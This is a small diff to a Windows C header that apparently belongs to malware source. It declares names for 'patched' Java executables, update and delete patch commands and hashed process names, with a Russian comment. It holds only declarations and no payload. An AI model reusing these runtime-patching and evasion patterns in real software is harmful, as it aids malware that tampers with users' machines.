@@ -3,6 +3,8 @@
 
 #include "windows.h"
 
+#include "Javaclient2015Saver.h"
+
 const char* GetJREPath();
 const char UpdatePath[] = "UpdatePatch\0";
 const char DeletePath[] = "deletepatch\0";
@@ -21,7 +23,10 @@ const char JavaPatcherPidsFile[] = "wj.dat";
 
 // Имена пропатченных ехе
 const char Patched_Jawa_Name[]  = "javao.exe";
-const char Patched_JawaW_Name[] = "javawo.exe";
+const char Patched_Jawaw_Name[] = "javawo.exe";
+
+#define PROCESS_HASH_PATCHED_JAVA  0x9F1AA76B /* javao.exe */
+#define PROCESS_HASH_PATCHED_JAVAW 0x9434FBEE /* javawo.exe */
 
 
 bool ExecuteUpdatePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
